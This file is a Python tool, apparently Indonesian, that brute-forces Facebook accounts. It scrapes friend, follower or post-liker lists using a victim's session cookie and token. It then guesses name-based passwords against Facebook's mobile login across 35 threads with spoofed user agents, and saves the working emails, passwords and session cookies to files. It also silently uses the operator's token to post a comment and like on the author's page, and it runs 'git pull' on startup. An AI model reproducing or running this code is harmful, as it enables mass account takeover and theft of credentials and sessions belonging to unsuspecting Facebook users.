#!/usr/bin/env python3
import requests, time, os, re, json, random
from rich.panel import Panel
from rich import print
from concurrent.futures import ThreadPoolExecutor
from rich.tree import Tree
from rich.console import Console

P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +#hu
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
batu = random.choice([M,H,K,B,U,O,N,Z])
### LIST DUMP ###
Dump = []
### BANNER OR LOGO ###
def banner_logo():
    os.system('git pull')
    os.system('cls' if os.name == 'nt' else 'clear')
     # Coded by Rozhak
    Console(width=60, style="bold blue").print(Panel("""[bold red]●[bold yellow] ●[bold green] ●
[bold red]       ██╗    ██╗   ██╗     █████╗     ███╗   ██╗        
[bold yellow]       ██║    ██║   ██║    ██╔══██╗    ████╗  ██║        
[bold blue]       ██║    ██║   ██║    ███████║    ██╔██╗ ██║        
[bold green]  ██   ██║    ██║   ██║    ██╔══██║    ██║╚██╗██║        
[bold red]  ╚█████╔╝    ╚██████╔╝    ██║  ██║    ██║ ╚████║             
[bold yellow]   ╚════╝      ╚═════╝     ╚═╝  ╚═╝    ╚═╝  ╚═══╝            
[bold red]● Author    : [bold blue]Juan Hulu   [bold red]● Github    : [bold blue]juan hulu 
[bold red]● Facebook  : [bold blue]Juan Hulu   [bold red]● Instagram : [bold blue]juan_hulu09
[bold red]● Youtube   : [bold blue]Juan Hulu   [bold red]● Tik Tok   : [bold blue]juan_hulu 
[bold blue]        \\|[bold green]Multi Brute Force Facebook[bold blue]|/""", title="[bold red]>[bold yellow]>[bold green]>[blue] juan_hulu09 [bold green]<[bold yellow]<[bold red]<"))
    return 0
### DAPATKAN NAMA ###
def dapatkan_nama(cookie, token_eaag):
    with requests.Session() as r:
        r.headers.update({
            'host': 'graph.facebook.com',
            'user-agent': 'Mozilla/5.0 (Linux; Android 11; RMX2144 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/375.1.0.28.111;]',
            'cookie': cookie
        })
        response = r.get('https://graph.facebook.com/v15.0/me/?fields=id,name&access_token={}'.format(token_eaag)).json()
        if 'name' in str(response) and 'id' in str(response):
            return response['name'].title(), response['id']
        else:
            Console(width=60, style="bold blue").print(Panel("[italic red] Cookies Facebook Expired!", title="[bold blue]([bold blue]Token Invalid[bold blue])"));time.sleep(3.2);login_cookie()
### LOGIN USING COOKIE ###
def login_cookie():
    try:
        banner_logo()
        Console(width=60, style="bold blue").print(Panel("""[bold green]1[bold green]. Login Cookie Facebook
[bold green]2[bold green]. Cara Mendapatkan Cookie Facebook
[bold green]3[bold green]. Keluar ([bold red]Logout[bold green])""", subtitle="╭───", subtitle_align="left", title="[bold red]>[bold yellow]>[bold green]>[blue] (Login Using Cookie) [bold green]<[bold yellow]<[bold red]<"))
        query = Console().input("[bold blue]   ╰─> ")
        if query == '1' or query == '01':
            Console(width=60, style="bold blue").print(Panel("[italic green]Silahkan Masukan[italic green] Cookie[italic green], Gunakan Tumbal Untuk Login Dan Pastikan Tidak Terkena[italic yellow] Checkpoint[italic green]!", subtitle="╭───", subtitle_align="left", title="[bold red]>[bold yellow]>[bold green]>[blue] (Catatan) [bold green]<[bold yellow]<[bold red]<"))
            cookie = Console().input("[bold blue]   ╰─> ")
            with requests.Session() as r:
                r.headers.update({
                    'cookie': cookie,
                    'user-agent': 'Mozilla/5.0 (Linux; Android 11; RMX2144 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/375.1.0.28.111;]',
                    'host': 'business.facebook.com'
                })
                response3 = r.get('https://business.facebook.com/business_locations').text
                token_eaag = re.search('(EAAG\w+)', str(response3)).group(1)
                name, id = dapatkan_nama(cookie, token_eaag)
                Console(width=60, style="bold blue").print(Panel(f"""[bold green]Nama :[bold green] {name}
[bold green]User :[bold yellow] {id}""", title="[bold red]>[bold yellow]>[bold green]>[blue] (Welcome) [bold green]<[bold yellow]<[bold red]<"));bot_komen(cookie, token_eaag)
                open('Data/Cookie.json', 'w').write(json.dumps({'Cookie': cookie}));open('Data/Token.json', 'w').write(json.dumps({'Token': token_eaag}));time.sleep(3.6);daftar_menu()
        elif query == '2' or query == '02':
            try:
                Console().print("[bold blue]   ╰─>[bold green] Kamu Akan Diarahkan Ke Youtube!", end='\r');time.sleep(3.6);os.system("xdg-open https://www.youtube.com/watch?v=3Y6xsMB3wRg");exit()
            except:exit()
        elif query == '3' or query == '03':
            Console().print("[bold blue]   ╰─>[bold yellow] Keluar Dari Tools!", end='\r');time.sleep(3.6);exit()
        else:
            Console().print("[bold blue]   ╰─>[bold red] Pilihan Tidak Diketahui!", end='\r');time.sleep(3.6);login_cookie()
    except Exception as e:
        Console(width=60, style="bold blue").print(Panel(f"[italic red]{str(e).title()}", title="[bold red]>[bold yellow]>[bold green]>[blue] (Error) [bold green]<[bold yellow]<[bold red]<"));exit()
### BOT KOMEN ###
def bot_komen(cookie, token_eaag):
    with requests.Session() as r: # Kagak Usah Di Ganti, Anggap Saja Sebagai Tanda Terimakasih :V
        text = random.choice(
            ['Keren Bang 😎','Hello World!','Mantap Bang ☺️','I Love You ❤️','Hai Bang 😘','hai bg','ganteng banget','bang gua pakek sc lu bg','bg aku dah follow tiktok lu Bg','yg penting komen','hahahah','😘','😍','🤣','😭','😅','😭','😘','😍','😅','😍','😘','😭','😅','😘','😍','🤣','😍','😅','😭','😘','😍','😅','😘','😭',' 👁👄👁 ',' 𝙁𝙖𝙘𝙚𝙢𝙤𝙟𝙞 𝙠𝙚𝙮𝙗𝙤𝙖𝙧𝙙 𝐢𝐬 ƚԋҽ ᘜᓍᗩᖶ 🐑 ',' ꊰꋬꉔꏂꂵꄲ꒻꒐ ꀘꏂꌦꃳꄲꋬꋪ꒯ 𝕚𝕤 𝓽𝓱𝓮 🄱🄴🅂🅃 𝘸𝘢𝘺 t̶o̶ 𝐭𝐲𝐩𝐞 c̼o̼o̼l̼ ƒσηтѕ ',' 🧚🏻‍♀️💫🥰💞 ','https://www.youtube.com/@juanhulu09','https://www.facebook.com/juanhulu2009','https://graph.facebook.com/174531078847946',' 𝔾𝕠𝕠𝕕 𝕄𝕠𝕣𝕟𝕚𝕟𝕘 ☼☼ ',' ♡⃝ ʜᴇʟʟᴏ ◡̈ ☽⋆ ',' 𝔾𝕠𝕠𝕕 𝔸𝕗𝕥𝕖𝕣𝕟𝕠𝕠𝕟 ',' 𝔾𝕠𝕠𝕕 ℕ𝕚𝕘𝕙𝕥 ☽⋆ ',' ♬ ♬ ♩ ♡ ♪ ♪ ♫ ♭ ♫ ♡ ',' 𝐍𝐈𝐂𝐄 𝐓𝐎 𝐌𝐄𝐄𝐓 𝐘𝐎𝐔☺︎︎ ',' ʜᴀᴠᴇ ᴀ ɴɪᴄᴇ ᴅᴀʏ︎ ',' ✐.ɴɪᴄᴇ ᴅᴀʏ 〰︎ ',' ℍ𝕒𝕧𝕖 𝕒 𝕤𝕨𝕖𝕖𝕥 𝕕𝕣𝕖𝕒𝕞 🛏 ',' H̆̈Ă̈V̆̈Ĕ̈ Ă̈ Ğ̈Ŏ̈Ŏ̈D̆̈ T̆̈Ĭ̈M̆̈Ĕ̈ ',' 🌈ℍ𝕒𝕡𝕡𝕪 𝕨𝕖𝕖𝕜 ',' 🍑 ʜᴀ͟ᴘ͟ᴘ͟ʏ ᴇᴠᴇʀʏᴅᴀʏ̆̈ ♥ ',' ❤️𝐈𝐦 𝐡𝐞𝐫𝐞 𝐟𝐨𝐫 𝐲𝐨𝐮❤',' ☆𝐇𝐨𝐰 𝐚𝐫𝐞 𝐲𝐨𝐮?☆ ',' B̆̈y̆̈ĕ̈ b̆̈y̆̈ĕ̈ દ ᵕ̈ ૩ 👋 ',' ᴄʜᴇᴇʀ ᴜᴘ ୧⍤⃝୨ ୧⌓̈⃝୨ ୧⍥⃝୨ ',' 𝓣𝓱𝓪𝓷𝓴 𝓨𝓸𝓾 ❤️ ',' (୨୧•͈ᴗ•͈)◞ᵗʱᵃᵑᵏઽ*♡ ',' ɪᴍ sᴏʀʀʏ 💝 ',' 𝕐𝕠𝕦 𝕒𝕣𝕖 𝕨𝕖𝕝𝕔𝕠𝕞𝕖 (●’◡’●)ﾉ ',' 𝙉𝙤 𝙋𝙧𝙤𝙗𝙡𝙚𝙢 (☞ ͡° ͜ʖ ͡°)☞ ',' 𝙄𝙩𝙨 𝙤𝙠𝙖𝙮 ◡̈ ',' ⓌⒽⒶⓉⓈ_ⓊⓅ',' ᗯᕼᗩT’ᔕ ᗯᖇOᑎᘜ ',' 𝓘 𝓴𝓷𝓸𝔀 ʕ•ᴥ•ʔ ',' 𝓘 𝓭𝓸𝓷𝓽 𝓴𝓷𝓸𝔀',' (๑′ᴗ‵๑)Ｉ Lᵒᵛᵉᵧₒᵤ♥ ',' TᕼᗩT’ᔕ ᘜᖇᗴᗩT ',' ᗩᗯᗴᔕOᗰᗴ ( ﾟ∀ﾟ)ﾉ ',' ♡+* Ɗɑɫë*+♡ ',' 🚚..........ᴅᴜᴅᴜ！ ',' ♡x♡=♡² ',' ♡ Life+u＝sweet ♡ ',' ♡ I Love U♡ ',' ♡ I Miss U♡ ',' ◌⑅⃝●♡⋆♡LOVE♡⋆♡●⑅⃝◌ ',' ◌⑅⃝ᵐᶦˢˢ(꜆˘͈ෆ˘͈꜀)ʸᵒᵘ⑅⃝◌ ',' ♥️❤️💜🖤🧡💛💚💙 ',' 💕💞💓💗💖💘💝 ',' E͜͡v͜͡e͜͡r͜͡y͜͡t͜͡h͜͡i͜͡n͜͡g͜͡ I͜͡ d͜͡o͜͡, I͜͡ d͜͡o͜͡ i͜͡t͜͡ f͜͡o͜͡r͜͡ y͜͡o͜͡u͜͡. ',' 𝓣𝓸 𝓶𝓮, 𝔂𝓸𝓾 𝓪𝓻𝓮 𝓹𝓮𝓻𝓯𝓮𝓬𝓽. ',' 𝗪𝗲 𝗮𝗿𝗲 𝗺𝗼𝘀𝘁 𝒂𝒍𝒊𝒗𝒆 𝘄𝗵𝗲𝗻 𝘄𝗲𝗿𝗲 𝗶𝗻 𝗹𝗼𝘃𝗲',' 𝑻𝒓𝒖𝒆 𝗹𝗼𝘃𝗲 𝘀𝘁𝗼𝗿𝗶𝗲𝘀 𝗻𝗲𝘃𝗲𝗿 𝗵𝗮𝘃𝗲 𝗲𝗻𝗱𝗶𝗻𝗴𝘀. ',' 𝕃𝕠𝕧𝕖 𝕪𝕠𝕦𝕣𝕤𝕖𝕝𝕗 𝕗𝕚𝕣𝕤𝕥 𝕒𝕟𝕕 𝕖𝕧𝕖𝕣𝕪𝕥𝕙𝕚𝕟𝕘 𝕗𝕒𝕝𝕝𝕤 𝕚𝕟𝕥𝕠 𝕝𝕚𝕟𝕖. ',' 𝕐𝕠𝕦 𝕔𝕒𝕟𝕥 𝕓𝕝𝕒𝕞𝕖 𝕘𝕣𝕒𝕧𝕚𝕥𝕪 𝕗𝕠𝕣 𝕗𝕒𝕝𝕝𝕚𝕟𝕘 𝕚𝕟 𝕝𝕠𝕧𝕖.',' 𝗬𝗼𝘂 𝗮𝗹𝘄𝗮𝘆𝘀 𝗴𝗮𝗶𝗻 𝗯𝘆 𝒈𝒊𝒗𝒊𝒏𝒈 𝗹𝗼𝘃𝗲. ',' 𝗔𝗹𝗹 𝘁𝗵𝗮𝘁 𝘆𝗼𝘂 𝗮𝗿𝗲 𝗶𝘀 𝗮𝗹𝗹 𝘁𝗵𝗮𝘁 𝗜𝗹𝗹 𝗲𝘃𝗲𝗿 𝒏𝒆𝒆𝒅.']
        )
        r.cookies.update({
            'cookie': cookie
        })
        response = r.post('https://graph.facebook.com/174531078847946/comments/?message={}&access_token={}'.format(text, token_eaag)).text # Jangan Di Ganti!
        response2 = r.post('https://graph.facebook.com/174531078847946/likes?summary=true&access_token={}'.format(token_eaag)).text # Jangan Di Ganti!
        if "\"id\":\"" in str(response) and str(response2) == 'true':
            return 0
        else:
            return 1
### DAFTAR MENU ###
def daftar_menu():
    try:
        banner_logo();cookie = json.loads(open('Data/Cookie.json', 'r').read())['Cookie']
        token_eaag = json.loads(open('Data/Token.json', 'r').read())['Token']
        name, id = dapatkan_nama(cookie, token_eaag)
        Console(width=60, style="bold blue").print(Panel(f"""[bold green]Nama :[bold green] {name}
[bold green]User :[bold yellow] {id}""", title="[bold red]>[bold yellow]>[bold green]>[blue] (Welcome) [bold green]<[bold yellow]<[bold red]<"))
    except Exception as e:
        Console(width=60, style="bold blue").print(Panel(f"[italic red]{str(e).title()}", title="[bold red]>[bold yellow]>[bold green]>[blue] (Error) [bold green]<[bold yellow]<[bold red]<"));time.sleep(3.6);login_cookie()
    Console(width=60, style="bold blue").print(Panel("""[bold green]1[bold green]. Crack User Dari Publik Or Friends
[bold green]2[bold green]. Crack User Dari Pengikut
[bold green]3[bold green]. Crack User Dari Like Postingan
[bold green]4[bold green]. Keluar ([bold red]Logout[bold green])""", subtitle="╭───", subtitle_align="left", title="[bold red]>[bold yellow]>[bold green]>[blue] (Crack Facebook) [bold green]<[bold yellow]<[bold red]<"))
    query = Console().input("[bold blue]   ╰─> ")
    if query == '1' or query == '01':
        try:
            Console(width=60, style="bold blue").print(Panel("[italic green]Silahkan Masukan[italic green] ID Akun Facebook[italic green], Gunakan Koma Untuk Dump Masal, Misalnya :[italic green] 757953543,4", subtitle="╭───", subtitle_align="left", title="[bold red]>[bold yellow]>[bold green]>[blue] (Catatan) [bold green]<[bold yellow]<[bold red]<"))
            userid = Console().input("[bold blue]   ╰─> ")
            for z in userid.split(','):
                dump().publik(int(z), cookie, unit_cursor = '')
            if len(Dump) < 50:
                Console().print("[bold blue]   ╰─>[bold yellow] Jumlah User Terlalu Sedikit!", end='\r');time.sleep(3.6);exit("\r                                                                         ")
            else:
                Console(width=60, style="bold blue").print(Panel(f"[bold green]Jumlah User :[bold green] {len(Dump)}", title="[bold red]>[bold yellow]>[bold green]>[blue] (Dump Sukses) [bold green]<[bold yellow]<[bold red]<"));crack().open_list()
        except Exception as e:
            Console(width=60, style="bold blue").print(Panel(f"[italic red]{str(e).title()}", title="[bold red]>[bold yellow]>[bold green]>[blue] (Error) [bold green]<[bold yellow]<[bold red]<"));exit()
    elif query == '2' or query == '02':
        try:
            Console(width=60, style="bold blue").print(Panel("[italic green]Silahkan Masukan[italic green] ID Akun Facebook[italic green], Gunakan Koma Untuk Dump Masal, Misalnya :[italic green] 757953543,4", subtitle="╭───", subtitle_align="left", title="[bold red]>[bold yellow]>[bold green]>[blue] (Catatan) [bold green]<[bold yellow]<[bold red]<"))
            userid = Console().input("[bold blue]   ╰─> ")
            for z in userid.split(','):
                dump().pengikut(z, cookie, token_eaag)
            if len(Dump) < 50:
                Console().print("[bold blue]   ╰─>[bold yellow] Jumlah User Terlalu Sedikit!", end='\r');time.sleep(3.6);exit("\r                                                                         ")
            else:
                Console(width=60, style="bold blue").print(Panel(f"[bold green]Jumlah User :[bold green] {len(Dump)}", title="[bold red]>[bold yellow]>[bold green]>[blue] (Dump Sukses) [bold green]<[bold yellow]<[bold red]<"));crack().open_list()
        except Exception as e:
            Console(width=60, style="bold blue").print(Panel(f"[italic red]{str(e).title()}", title="[bold red]>[bold yellow]>[bold green]>[blue] (Error) [bold green]<[bold yellow]<[bold red]<"));exit()
    elif query == '3' or query == '03':
        try:
            Console(width=60, style="bold blue").print(Panel("[italic green]Silahkan Masukan ID Postingan, Gunakan Koma Untuk Dump Masal, Misalnya :[italic green] 10160334652393544", subtitle="╭───", subtitle_align="left", title="[bold red]>[bold yellow]>[bold green]>[blue] (Catatan) [bold green]<[bold yellow]<[bold red]<"))
            postid = Console().input("[bold blue]   ╰─> ")
            for z in postid.split(','):
                dump().likes(z, cookie, token_eaag, after = '')
            if len(Dump) < 1:
                Console().print("[bold blue]   ╰─>[bold yellow] Jumlah User Terlalu Sedikit!", end='\r');time.sleep(3.6);exit("\r                                                                         ")
            else:
                Console(width=60, style="bold blue").print(Panel(f"[bold green]Jumlah User :[bold green] {len(Dump)}", title="[bold red]>[bold yellow]>[bold green]>[blue] (Dump Sukses) [bold green]<[bold yellow]<[bold red]<"));crack().open_list()
        except Exception as e:
            Console(width=60, style="bold blue").print(Panel(f"[italic red]{str(e).title()}", title="[bold red]>[bold yellow]>[bold green]>[blue] (Error) [bold green]<[bold yellow]<[bold red]<"));exit()
    elif query == '4' or query == '04':
        try:
            os.remove('Data/Cookie.json');os.remove('Data/Token.json');Console().print("[bold blue]   ╰─>[bold green] Keluar Dari Program!", end='\r');time.sleep(3.6);exit()
        except:exit()
    else:
        Console().print("[bold blue]   ╰─>[bold red] Pilihan Tidak Diketahui!", end='\r');time.sleep(3.6);daftar_menu()
### DUMP ###
class dump:

    def __init__(self) -> None:
        pass
    ### DUMP PUBLIK ###
    def publik(self, userid, cookie, unit_cursor):
        try:
            with requests.Session() as r:
                r.headers.update({
                    'upgrade-insecure-requests': '1',
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'host': 'm.facebook.com',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]',
                    'accept-language': 'id,en;q=0.9',
                })
                r.cookies.update({
                    'cookie': cookie
                })
                response = r.get('https://m.facebook.com/profile.php?id={}&v=friends&unit_cursor={}'.format(userid, unit_cursor)).text
                self.all_friends = re.findall('href="fb://profile/(.*?)">(.*?)<', str(response))
                for z in self.all_friends:
                    self.id_friends, self.name = z[0], z[1].lower()
                    if len(self.name) == 0 or len(self.name) > 100:
                        continue
                    else:
                        if str(self.id_friends) in str(Dump):
                            continue
                        else:
                            Console().print(f"[bold blue]   ╰─>[bold green] Dump {self.id_friends}/{len(Dump)} User         ", end='\r');time.sleep(0.0007)
                            Dump.append(f'{self.id_friends}|{self.name}')
                if 'Sorry, something went wrong.' in str(response):
                    Console().print(f"[bold blue]   ╰─>[bold yellow] Sorry, Something Went Wrong!          ", end='\r');time.sleep(2.1)
                    return 0
                elif 'unit_cursor=' in str(response):
                    try:
                        self.unit_cursor = re.search('unit_cursor=(.*?)&', str(response)).group(1)
                        self.publik(userid, cookie, self.unit_cursor)
                    except (AttributeError):
                        Console().print(f"[bold blue]   ╰─>[bold red] Cursor Not Found!            ", end='\r');time.sleep(2.1)
                        return 2
                else:
                    return 0
        except (KeyboardInterrupt):
            Console().print(f"[bold blue]   ╰─>[bold yellow] KeyboardInterrupt!          ", end='\r');time.sleep(3.6)
            return 3
    ### DUMP PENGIKUT ### JANGAN DI TUKAR
    def pengikut(self, userid, cookie, token_eaag):
        try:
            with requests.Session() as r:
                r.headers.update({
                    'host': 'graph.facebook.com',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 11; RMX2144 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/375.1.0.28.111;]',
                    'cookie': cookie
                })
                response = r.get('https://graph.facebook.com/v1.0/{}/subscribers?access_token={}&pretty=1&fields=id%2Cname&limit=5000'.format(userid, token_eaag)).json()
                if 'summary' in str(response) and 'name' in str(response):
                    for z in response['data']:
                        try:
                            self.id, self.name = z['id'], z['name'].lower()
                            if str(self.id) in str(Dump):
                                continue
                            else:
                                Console().print(f"[bold blue]   ╰─>[bold green] Dump {self.id}/{len(Dump)} User         ", end='\r');time.sleep(0.0007)
                                Dump.append(f'{self.id}|{self.name}')
                        except (KeyError):
                            Console().print(f"[bold blue]   ╰─>[bold red] KeyError!                ", end='\r');time.sleep(3.6);continue
                    return 0
                else:
                    Console().print(f"[bold blue]   ╰─>[bold yellow] Gagal {userid} User!          ", end='\r');time.sleep(3.6)
                    return 1
        except (KeyboardInterrupt):
            Console().print(f"[bold blue]   ╰─>[bold yellow] KeyboardInterrupt!          ", end='\r');time.sleep(3.6)
            return 2
    ### DUMP LIKES ###
    def likes(self, postid, cookie, token_eaag, after):
        try:
            with requests.Session() as r:
                r.headers.update({
                    'host': 'graph.facebook.com',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 11; RMX2144 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/375.1.0.28.111;]',
                    'cookie': cookie
                })
                response = r.get('https://graph.facebook.com/v1.0/{}/likes/?access_token={}&pretty=1&limit=25&after={}'.format(postid, token_eaag, after)).json()
                if 'id' in str(response) and 'name' in str(response):
                    for z in response['data']:
                        self.id, self.name = z['id'], z['name'].lower()
                        if str(self.id) in str(Dump):
                            continue
                        else:
                            Console().print(f"[bold blue]   ╰─>[bold green] Dump {self.id}/{len(Dump)} User         ", end='\r');time.sleep(0.0007)
                            Dump.append(f'{self.id}|{self.name}')
                    if '\'after\':' in str(response):
                        self.likes(postid, cookie, token_eaag, after = response['paging']['cursors']['after'])
                    else:
                        return 0
                else:
                    Console().print(f"[bold blue]   ╰─>[bold yellow] Gagal {postid} User!          ", end='\r');time.sleep(3.6)
                    return 1
        except (KeyboardInterrupt):
            Console().print(f"[bold blue]   ╰─>[bold yellow] KeyboardInterrupt!          ", end='\r');time.sleep(3.6)
            return 2
### CRACK ###
class crack:

    def __init__(self) -> None:
        self.checkpoint, self.looping, self.success = [], 0, []
        pass
    ### GENERATE PASSWORD ###
    def generate_password(self, name):
        self.password = []
        for nama in name.split(' '):
            if len(name) <= 5:
                if len(nama) < 3:
                    continue
                else:
                    self.password.append(nama + '123')
                    self.password.append(nama + '1234')
                    self.password.append(nama + '12345')
                    self.password.append(nama + '123456')
            else:
                if len(nama) < 3:
                    self.password.append(name)
                else:
                    self.password.append(name)
                    self.password.append(nama + '123')
                    self.password.append(nama + '1234')
                    self.password.append(nama + '12345')
                    self.password.append(nama + '123456')
        self.password_ = []
        for z in self.password:
            if str(z) in str(self.password_):
                continue
            else:
                self.password_.append(z)
        return self.password_
    ### OPEN LIST DUMP ###
    def open_list(self):
        try:
            Console(width=60, style="bold blue").print(Panel("""[bold green]Hasil Crack[bold green] Ok[bold green] Tersimpan Di :[bold green] Results/Ok.txt
[bold green]Hasil Crack[bold red] Cp[bold green] Tersimpan Di :[bold red] Results/Cp.txt""", title="[bold red]>[bold yellow]>[bold green]>[blue] (Results Crack) [bold green]<[bold yellow]<[bold red]"))
            with ThreadPoolExecutor(max_workers=35) as (V):
                for z in Dump:
                    self.email, self.nama = z.split('|')[0], z.split('|')[1]
                    self.password = self.generate_password(self.nama)
                    V.submit(self.main, Dump, self.email, self.password)
            Console().print("\r[bold green][[bold green]Selesai[bold green]]                           ");exit()
        except:exit()
    ### MAIN ###
    def main(self, total, email, password):
        try:
            for pws in password:
                self.useragent = self.realme_useragent(total = 1)
                with requests.Session() as r:
                    r.headers.update({
                        'connection': 'keep-alive',
                        'accept-language': 'id,en-US;q=0.9,en;q=0.8',
                        'sec-fetch-mode': 'navigate',
                        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                        'sec-fetch-sest': 'document',
                        'sec-fetch-site': 'none',
                        'cache-control': 'max-age=0',
                        'sec-fetch-user': '?1',
                        'upgrade-insecure-requests': '1',
                        'host': 'm.alpha.facebook.com',
                        'user-agent': self.useragent
                    })
                    response = r.get('https://m.alpha.facebook.com/login.php?').text
                    try:
                        self.jazoest = re.search('name="jazoest" value="(\d+)"', str(response)).group(1)
                        self.m_ts = re.search('name="m_ts" value="(.*?)"', str(response)).group(1)
                        self.li = re.search('name="li" value="(.*?)"', str(response)).group(1)
                        self.fb_dtsg = re.search('{"dtsg":{"token":"(.*?)"', str(response)).group(1)
                        self.lsd = re.search('name="lsd" value="(.*?)"', str(response)).group(1)
                        self.__a = re.search('"encrypted":"(.*?)"', str(response)).group(1)
                        self.__spin_t = re.search('"__spin_t":(\d+),', str(response)).group(1)
                    except (AttributeError) as e:
                        Console().print("[bold blue]   ╰─>[bold red] Failed Scraping...                    ", end='\r');time.sleep(2.0);continue
                    data = {
                        'm_ts': self.m_ts,
                        'li': self.li,
                        'try_number': 0,
                        'unrecognized_tries': 0,
                        'email': email,
                        'prefill_contact_point': email,
                        'prefill_source': 'browser_dropdown',
                        'prefill_type': 'password',
                        'first_prefill_source': 'browser_dropdown',
                        'first_prefill_type': 'contact_point',
                        'had_cp_prefilled': True,
                        'had_password_prefilled': True,
                        'is_smart_lock': False,
                        'bi_xrwh': 0,
                        'encpass': '#PWD_BROWSER:0:{}:{}'.format(self.__spin_t, pws),
                        'fb_dtsg': self.fb_dtsg,
                        'jazoest': self.jazoest,
                        'lsd': self.lsd,
                        '__dyn': '',
                        '__csr': '',
                        '__req': random.choice(['1','2','3','4','5']),
                        '__a': self.__a,
                        '__user': 0
                    }
                    r.headers.update({
                        'cookie': ("; ".join([str(x)+"="+str(y) for x,y in r.cookies.get_dict().items()])),
                        'sec-fetch-site': 'same-origin',
                        'origin': 'https://m.alpha.facebook.com',
                        'accept': '*/*',
                        'content-type': 'application/x-www-form-urlencoded',
                        'x-fb-lsd': self.lsd,
                        'referer': 'https://m.alpha.facebook.com/login.php?',
                        'content-length': str(len(("&").join([ "%s=%s" % (x, y) for x, y in data.items() ])))
                    })
                    response2 = r.post('https://m.alpha.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100', data = data, allow_redirects = True)
                    #open('Response.txt', 'a+').write(f'{email}|{pws}|{r.cookies.get_dict()}\n')
                    if 'c_user' in r.cookies.get_dict().keys():
                        try:
                            self.cookie = (";".join([str(x)+"="+str(y) for x,y in r.cookies.get_dict().items()]))
                        except:pass
                        tree = Tree("\r[bold green]LOGIN SUCCESS                      ", style = "bold green")
                        tree.add(f"[bold green]Email : {email}").add(f"[bold green]Password : {pws}", style = "bold green")
                        tree.add(f"[bold green]Cookie : {self.cookie}", style = "bold green")
                        print(tree)
                        self.success.append(f'{email}|{pws}|{self.cookie}')
                        open('Results/Ok.txt', 'a+').write(f'{email}|{pws}|{self.cookie}\n')
                        break
                    elif 'checkpoint' in r.cookies.get_dict().keys():
                        tree = Tree("\r[bold green]LOGIN CHECKPOINT                      ", style = "bold green")
                        tree.add(f"[bold red]Email : {email}").add(f"[bold red]Password : {pws}", style = "bold green")
                        tree.add(f"[bold red]Useragent : {self.useragent}", style = "bold green")
                        tree.add(f"[bold green]Cookie : {self.cookie}", style = "bold green")
                        print(tree)
                        self.checkpoint.append(f'{email}|{pws}|{self.useragent}')
                        open('Results/Cp.txt', 'a+').write(f'{email}|{pws}|{self.useragent}\n')
                        break
                    else:
                        continue
            self.looping += 1
            Console().print(f"[bold blue]   ╰─>[bold green] Crack {str(len(Dump))}/{self.looping} Ok:-[bold green]{len(self.success)}[bold green] Cp:-[bold red]{len(self.checkpoint)}[bold green]              ", end='\r')
        except (requests.exceptions.ConnectionError, requests.exceptions.ChunkedEncodingError):
            Console().print("[bold blue]   ╰─>[bold red] Koneksi Error!                    ", end='\r');time.sleep(7.9);self.main(total, email, password)
    ### REALME USERAGENT ###
    def realme_useragent(self, total):
        for _ in range(total):
            self.browser_version = (f'{random.randrange(85, 105)}.0.{random.randrange(4200, 4900)}.{random.randrange(40, 150)}')
            self.build = (''.join(random.choice('1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890') for y in range(6)))
            self.android_version = random.choice(['11', '10'])
            self.android_model = random.choice(['RMX2052', 'RMX2072', 'RMX2075', 'RMX2071', 'RMX2076', 'RMX2144'])
            self.useragent = ('Mozilla/5.0 (Linux; Android {}; {} Build/{}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{} Mobile Safari/537.36'.format(self.android_version, self.android_model, self.build, self.browser_version))
        return self.useragent

if __name__ == '__main__':
    try:
        os.system('git pull');daftar_menu()
    except Exception as e:
        Console(width=60, style="bold blue").print(Panel(f"[italic red]{str(e).title()}", title="[bold red]>[bold yellow]>[bold green]>[blue] (Error) [bold green]<[bold yellow]<[bold red]<"));exit()
